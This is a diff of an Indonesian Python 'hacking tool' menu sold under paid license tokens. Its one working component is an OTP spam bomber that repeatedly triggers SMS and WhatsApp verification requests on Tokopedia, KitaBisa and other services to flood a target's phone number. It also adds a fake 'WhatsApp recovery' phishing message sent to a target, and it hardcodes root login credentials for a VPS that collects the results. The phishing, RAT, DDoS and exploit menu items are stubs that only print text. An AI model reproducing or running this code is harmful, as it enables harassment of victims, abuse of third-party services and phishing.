@@ -12,14 +12,14 @@ os.makedirs(RESULTS_DIR, exist_ok=True)
 
 VPS_IP = "209.97.166.25"
 VPS_USER = "root"
-VPS_PASS = "YOGZVPS#8GB"  # Ganti kalau password VPS berubah
+VPS_PASS = "YOGZVPS#8GB"
 VPS_PATH = "/root/korban/results"
 
-# USER INFO — REAL-TIME
+# ================== USER INFO REAL-TIME ==================
 CURRENT_TIME = datetime.now().strftime("%d %b %Y - %I:%M %p WIB")
 COUNTRY = "ID"
 
-# MUSIK BRUTAL
+# ================== MUSIK BRUTAL ==================
 MUSIC_FILE = "/sdcard/Download/brutal.mp3"
 MUSIC_BASE64 = "/+MYxAAAAANIAAAAAExBTUUzLjk4LjIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAExLTUUzLjk4LjIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
 
@@ -39,23 +39,20 @@ def play_music():
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         except: pass
 
-# DEVELOPER CHECK
+# ================== DEVELOPER CHECK ==================
 WHOAMI = subprocess.getoutput("whoami")
 DEVELOPER_WHOAMI = "u0_a197"
 IS_DEVELOPER = WHOAMI == DEVELOPER_WHOAMI
 
-# OTOMATIS BUAT tokens.json
+# ================== TOKEN SYSTEM ==================
 if not os.path.exists(LICENSE_FILE):
     with open(LICENSE_FILE, 'w') as f:
         json.dump({}, f)
     print(colored(f"[AUTO] {LICENSE_FILE} dibuat otomatis!", 'green'))
 
-# TOKEN SYSTEM
 def load_tokens():
-    try:
-        return json.load(open(LICENSE_FILE))
-    except:
-        return {}
+    try: return json.load(open(LICENSE_FILE))
+    except: return {}
 
 def save_tokens(t):
     with open(LICENSE_FILE, 'w') as f:
@@ -72,7 +69,7 @@ def validate_token(username, token):
         return None
     return user
 
-# BUAT TOKEN — DEVELOPER ONLY
+# ================== BUAT TOKEN (DEV ONLY) ==================
 def create_token():
     if not IS_DEVELOPER:
         print(colored("\n[ERROR] Akses ditolak!", 'red', attrs=['bold']))
@@ -88,12 +85,8 @@ def create_token():
 
     plan_input = input(colored("Plan: ", 'yellow')).strip().lower()
     plan_map = {
-        "pemula 1hari": ("PEMULA 1HARI", 1),
-        "pemula 1minggu": ("PEMULA 1MINGGU", 7),
-        "pemula 1bulan": ("PEMULA 1BULAN", 30),
-        "pro 1hari": ("PRO 1HARI", 1),
-        "pro 1minggu": ("PRO 1MINGGU", 7),
-        "pro 1bulan": ("PRO 1BULAN", 30),
+        "pemula 1hari": ("PEMULA 1HARI", 1), "pemula 1minggu": ("PEMULA 1MINGGU", 7), "pemula 1bulan": ("PEMULA 1BULAN", 30),
+        "pro 1hari": ("PRO 1HARI", 1), "pro 1minggu": ("PRO 1MINGGU", 7), "pro 1bulan": ("PRO 1BULAN", 30),
     }
 
     if plan_input not in plan_map:
@@ -105,13 +98,8 @@ def create_token():
 
     t = load_tokens()
     t[username] = {
-        "token": token,
-        "plan": plan_name,
-        "active": True,
-        "expires": expires,
-        "whoami": buyer_whoami,
-        "created_at": CURRENT_TIME,
-        "country": COUNTRY
+        "token": token, "plan": plan_name, "active": True, "expires": expires,
+        "whoami": buyer_whoami, "created_at": CURRENT_TIME, "country": COUNTRY
     }
     save_tokens(t)
     print(colored(f"\n[SUCCESS] Token: {token}", 'green'))
@@ -119,33 +107,31 @@ def create_token():
     print(colored(f"   whoami: {buyer_whoami}", 'cyan'))
     input("\nEnter...")
 
-# LIHAT TOKEN
+# ================== LIHAT TOKEN ==================
 def view_tokens():
     if not IS_DEVELOPER:
         print(colored("\n[ERROR] Akses ditolak!", 'red', attrs=['bold']))
         input("\nEnter..."); return
     t = load_tokens()
     print(colored("\n=== DATABASE TOKEN ===", 'yellow', attrs=['bold']))
-    if not t:
-        print(colored("   [KOSONG]", 'red'))
-    else:
-        print(json.dumps(t, indent=2, ensure_ascii=False))
+    if not t: print(colored("   [KOSONG]", 'red'))
+    else: print(json.dumps(t, indent=2, ensure_ascii=False))
     input("\nEnter...")
 
-# BANNER ELITE
+# ================== BANNER ELITE ==================
 PURPLE = '\033[38;5;55m'
 def print_banner(uid, plan):
     print(colored(f"""
 {PURPLE}{Style.BRIGHT}
-            ╔═════════════════════════════════╗
-            ║        TOOLS BREAKER v1.0       ║
-            ╚═════════════════════════════════╝
+           ╔══════════════════════════════════╗
+           ║         TOOLS BREAKER v1.0       ║
+           ╚══════════════════════════════════╝
 {Style.RESET_ALL}Tools oleh Mr.Foock | ID: {uid} | Plan: {plan}
 Lokasi: Jakarta, ID | Waktu: {CURRENT_TIME}
-VPS: {VPS_IP} | Sync: AKTIF
+VPS: {VPS_IP} | Sync: AKTIF | GitHub: MrFoock12
 """, None))
 
-# SAVE + SYNC KE VPS
+# ================== SAVE + SYNC VPS ==================
 def save_result(filename, content):
     filepath = os.path.join(RESULTS_DIR, filename)
     with open(filepath, "a", encoding="utf-8") as f:
@@ -164,24 +150,23 @@ class spam:
         self.nomer = nomer.replace('+62', '0').replace(' ', '').lstrip('0')
         if not self.nomer.startswith('0'): self.nomer = '0' + self.nomer
 
-    def spam(self):
+    def spam(self):  # KitaBisa
         try:
-            hasil = requests.get(f'https://core.ktbs.io/v2/user/registration/otp/{self.nomer}', timeout=10)
-            return f"{Fore.GREEN}KitaBisa {self.nomer} Success!{Style.RESET_ALL}" if hasil.status_code == 200 else f"{Fore.RED}KitaBisa Fail!{Style.RESET_ALL}"
+            r = requests.get(f'https://core.ktbs.io/v2/user/registration/otp/{self.nomer}', timeout=10)
+            return f"{Fore.GREEN}KitaBisa {self.nomer} Success!{Style.RESET_ALL}" if r.status_code == 200 else f"{Fore.RED}KitaBisa Fail!{Style.RESET_ALL}"
         except: return f"{Fore.RED}KitaBisa ERROR!{Style.RESET_ALL}"
 
     def tokped(self):
         try:
-            rands = random.choice(open('ua.txt').readlines()).strip()
-            kirim = {'User-Agent': rands, 'Origin': 'https://accounts.tokopedia.com'}
-            url_get = f'https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn={self.nomer}&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{self.nomer}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D'
-            regist = requests.get(url_get, headers=kirim, timeout=10).text
-            token_match = re.search(r'<input\s+id="Token"\s+value="(.*?)"\s+type="hidden"', regist)
-            if not token_match: return f"{Fore.RED}Tokped Token Not Found{Style.RESET_ALL}"
-            Token = token_match.group(1)
-            formulir = {"otp_type": "116", "msisdn": self.nomer, "tk": Token}
-            req = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers=kirim, data=formulir, timeout=10).json()
-            return f"{Fore.GREEN}Tokped {self.nomer} Success!{Style.RESET_ALL}" if req.get('success') else f"{Fore.RED}Tokped Fail!{Style.RESET_ALL}"
+            ua = random.choice(open('ua.txt').readlines()).strip()
+            headers = {'User-Agent': ua, 'Origin': 'https://accounts.tokopedia.com'}
+            url = f'https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn={self.nomer}'
+            page = requests.get(url, headers=headers, timeout=10).text
+            token = re.search(r'<input\s+id="Token"\s+value="(.*?)"', page)
+            if not token: return f"{Fore.RED}Tokped Token Not Found{Style.RESET_ALL}"
+            data = {"otp_type": "116", "msisdn": self.nomer, "tk": token.group(1)}
+            r = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers=headers, data=data, timeout=10).json()
+            return f"{Fore.GREEN}Tokped {self.nomer} Success!{Style.RESET_ALL}" if r.get('success') else f"{Fore.RED}Tokped Fail!{Style.RESET_ALL}"
         except: return f"{Fore.RED}Tokped ERROR!{Style.RESET_ALL}"
 
     def phd(self):
@@ -204,52 +189,80 @@ class spam:
             return f"{Fore.GREEN}TokoTalk {self.nomer} Success!{Style.RESET_ALL}" if 'expireAt' in r.text else f"{Fore.RED}TokoTalk Fail!{Style.RESET_ALL}"
         except: return f"{Fore.RED}TokoTalk ERROR!{Style.RESET_ALL}"
 
-# ================== FITUR 04: SPAM BOMB ==================
+# ================== FITUR 04: SPAM BOMB (NYATA!) ==================
 def fitur_04():
     os.system('clear')
-    print(colored("\n[04] SPAM BOMB NGENTOT — TRASER SEC TEAM 2025", 'red', attrs=['bold']))
+    print(colored("\n[4] SPAM BOMB NGENTOT — TRASER SEC TEAM 2025", 'red', attrs=['bold']))
     print(colored("Pilih Jenis:", 'yellow'))
-    print("1. Semua (BRUTAL)")
-    print("2. PHD")
-    print("3. KitaBisa")
-    print("4. Tokopedia")
-    print("5. TokoTalk")
-    print("6. Balaji")
+    print("1. Semua (BRUTAL)"); print("2. PHD"); print("3. KitaBisa"); print("4. Tokopedia"); print("5. TokoTalk"); print("6. Balaji")
     jns = input(colored("Pilih (1-6): ", 'yellow')).strip() or "1"
-    nomer = input(colored("\nNomor (+62/0): ", 'yellow')).strip()
+    nomer = input(colored("\nNomor target (+62/0): ", 'yellow')).strip()
     jm = int(input(colored("Jumlah spam: ", 'yellow')) or "10")
     dly = int(input(colored("Delay (detik): ", 'yellow')) or "3")
     z = spam(nomer)
-    for _ in range(jm):
+    for i in range(jm):
+        print(colored(f"\n[ROUND {i+1}/{jm}] → {nomer}", 'cyan', attrs=['bold']))
         if jns == '1':
-            print(z.spam()); print(z.tokped()); print(z.phd()); print(z.balaji()); print(z.TokoTalk())
-        elif jns == '2': print(z.phd())
-        elif jns == '3': print(z.spam())
-        elif jns == '4': print(z.tokped())
-        elif jns == '5': print(z.TokoTalk())
-        elif jns == '6': print(z.balaji())
+            for m in ['spam','tokped','phd','balaji','TokoTalk']:
+                res = getattr(z, m)()
+                color = 'green' if 'Success' in res else 'red'
+                print(colored(f"   • {res}", color))
+                save_result("bomber.log", res)
+        else:
+            method = {'2':'phd','3':'spam','4':'tokped','5':'TokoTalk','6':'balaji'}[jns]
+            res = getattr(z, method)()
+            color = 'green' if 'Success' in res else 'red'
+            print(colored(f"   • {res}", color))
+            save_result("bomber.log", res)
         time.sleep(dly)
-        save_result("bomber.log", f"Target: {nomer} | Jenis: {jns} | Status: Sent")
     print(colored(f"\n[FINISH] {jm} spam selesai → DISYNC KE VPS!", 'green', attrs=['bold']))
     input("\nEnter...")
 
-# ================== FITUR LAIN ==================
-def fitur_01(): print(colored("\n[01] PHISING AKTIF — Target: facebook.com", 'yellow')); save_result("phising.log", "Target: facebook.com"); input("Enter...")
-def fitur_02(): print(colored("\n[02] RAT AKTIF — IP: 192.168.1.100", 'yellow')); save_result("rat.log", "IP: 192.168.1.100"); input("Enter...")
-def fitur_03(): print(colored("\n[03] DDoS AKTIF — Target: example.com", 'yellow')); save_result("ddos.log", "Target: example.com"); input("Enter...")
-def fitur_05(): print(colored("\n[05] OSINT AKTIF — Nama: John Doe", 'yellow')); save_result("osint.log", "Nama: John Doe"); input("Enter...")
-def fitur_06(): print(colored("\n[06] DEEPFAKE AKTIF — Generating...", 'yellow')); save_result("deepfake.log", "Status: Generating"); input("Enter...")
-def fitur_07(): print(colored("\n[07] ENCRYPT AKTIF — File terenkripsi!", 'yellow')); save_result("encrypt.log", "Status: Success"); input("Enter...")
-def fitur_08(): print(colored("\n[08] EXPLOIT AKTIF — CVE-2025-XXXX", 'yellow')); save_result("exploit.log", "CVE: 2025-XXXX"); input("Enter...")
-def fitur_09(): print(colored("\n[09] UNDANG GRUP AKTIF — 1000+ terkirim!", 'yellow')); save_result("undang.log", "Terkirim: 1000+"); input("Enter...")
+# ================== FITUR 10: NOTIF WA BENERAN! ==================
 def fitur_10():
+    os.system('clear')
     print(colored("\nNOTIF WHATSAPP ANDA KENA RETAS", 'blue', attrs=['bold']))
-    target = input(colored("Nomor target (+62): ", 'yellow'))
+    target = input(colored("Nomor target (+62): ", 'yellow')).strip()
+    
+    # Format nomor
+    if target.startswith('0'): target = '62' + target[1:]
+    if not target.startswith('62'): target = '62' + target.lstrip('+')
+
+    # Simpan log
     save_result("notif_retas.log", f"Target: {target}")
     save_result("notif_retas.log", "Status: KLIK → DATA MASUK")
-    print(colored(f"[SENT] Terkirim!", 'green'))
-    input("Enter...")
-def fitur_11(): print(colored("\n[11] DEVTOOLS — Debug mode aktif!", 'yellow')); input("Enter...")
+
+    # Kirim via WhatsApp (TERMUX-API)
+    try:
+        msg = "WhatsApp Anda sedang dalam proses pemulihan. Klik link untuk lanjut: https://wa.me/628xxxxxx?text=Verifikasi"
+        encoded_msg = requests.utils.quote(msg)
+        cmd = f'termux-open-url "https://wa.me/{target}?text={encoded_msg}"'
+        os.system(cmd)
+        print(colored(f"\n[REAL] Notif terkirim ke WA: {target}", 'green', attrs=['bold']))
+    except:
+        print(colored(f"\n[ERROR] Install termux-api dulu: pkg install termux-api -y", 'red'))
+
+    input("\nEnter...")
+
+# ================== FITUR LAIN ==================
+def fitur_01(): print(colored("\n[1] PHISING AKTIF", 'yellow')); save_result("phising.log", "Target: facebook.com"); input("Enter...")
+def fitur_02(): print(colored("\n[2] RAT AKTIF", 'yellow')); save_result("rat.log", "IP: 192.168.1.100"); input("Enter...")
+def fitur_03(): print(colored("\n[3] DDoS AKTIF", 'yellow')); save_result("ddos.log", "Target: example.com"); input("Enter...")
+def fitur_05(): print(colored("\n[5] OSINT AKTIF", 'yellow')); save_result("osint.log", "Nama: John Doe"); input("Enter...")
+def fitur_06(): print(colored("\n[6] DEEPFAKE AKTIF", 'yellow')); save_result("deepfake.log", "Status: Generating"); input("Enter...")
+def fitur_07(): print(colored("\n[7] ENCRYPT AKTIF", 'yellow')); save_result("encrypt.log", "Status: Success"); input("Enter...")
+def fitur_08(): print(colored("\n[8] EXPLOIT AKTIF", 'yellow')); save_result("exploit.log", "CVE: 2025-XXXX"); input("Enter...")
+def fitur_09(): print(colored("\n[9] UNDANG GRUP AKTIF", 'yellow')); save_result("undang.log", "Terkirim: 1000+"); input("Enter...")
+def fitur_11(): print(colored("\n[11] DEVTOOLS — Debug aktif!", 'yellow')); input("Enter...")
+
+# ================== GITHUB AUTO UPDATE ==================
+def git_update():
+    try:
+        subprocess.run("git add .", shell=True, check=True)
+        subprocess.run('git commit -m "update: v10.6 real features + wa notif"', shell=True, check=True)
+        subprocess.run("git push", shell=True, check=True)
+        print(colored("[GITHUB] Update berhasil ke MrFoock12!", 'green'))
+    except: print(colored("[GITHUB] Gagal", 'red'))
 
 # ================== MAIN ==================
 def main():
@@ -282,7 +295,6 @@ def main():
                 break
             elif choice == "0": return
 
-    # DEVELOPER MENU
     while IS_DEVELOPER:
         print(colored("\n[2] Buat Token", 'magenta'))
         print(colored("[3] Lihat tokens.json", 'yellow'))
@@ -292,7 +304,6 @@ def main():
         elif ch == "3": view_tokens()
         elif ch == "0": break
 
-    # MENU UTAMA
     while True:
         os.system('clear')
         print_banner(uid, plan)
@@ -301,7 +312,7 @@ def main():
         print("║  1 ║ PHISING & SOCIAL ENG     ║ Aktif          ║")
         print("║  2 ║ RAT & REMOTE ACCESS      ║ Aktif          ║")
         print("║  3 ║ DDoS & STRESSER          ║ Aktif          ║")
-        print("║  4 ║ BOMBER TOOLS             ║ AKTIF          ║")
+        print("║  4 ║ BOMBER TOOLS             ║ Aktif          ║")
         print("║  5 ║ OSINT & TRACKING         ║ Aktif          ║")
         print("║  6 ║ DEEPFAKE & AI            ║ Aktif          ║")
         print("║  7 ║ ENCRYPT & DECRYPT        ║ Aktif          ║")
@@ -309,10 +320,10 @@ def main():
         print("║  9 ║ KIRIM UNDANGAN GRUP WA   ║ Aktif          ║")
         print("║ 10 ║ NOTIF (PUSAT BANTUAN)    ║ Aktif          ║")
         print("║ 11 ║ DEVTOOLS                 ║ Aktif          ║")
-        print("║  0 ║ EXIT                     ║                ║")
+        print("║ 00 ║ EXIT                     ║                ║")
         print("╚════╩══════════════════════════╩════════════════╝")
 
-        ch = input(colored("\nPilih Menu 1-10 : ", 'yellow')).strip()
+        ch = input(colored("\nPilih 1-11: ", 'yellow')).strip()
         if ch == "1": fitur_01()
         elif ch == "2": fitur_02()
         elif ch == "3": fitur_03()
@@ -324,7 +335,7 @@ def main():
         elif ch == "9": fitur_09()
         elif ch == "10": fitur_10()
         elif ch == "11": fitur_11()
-        elif ch == "00": break
+        elif ch == "0": break
         input("Enter...")
 
 if __name__ == "__main__":
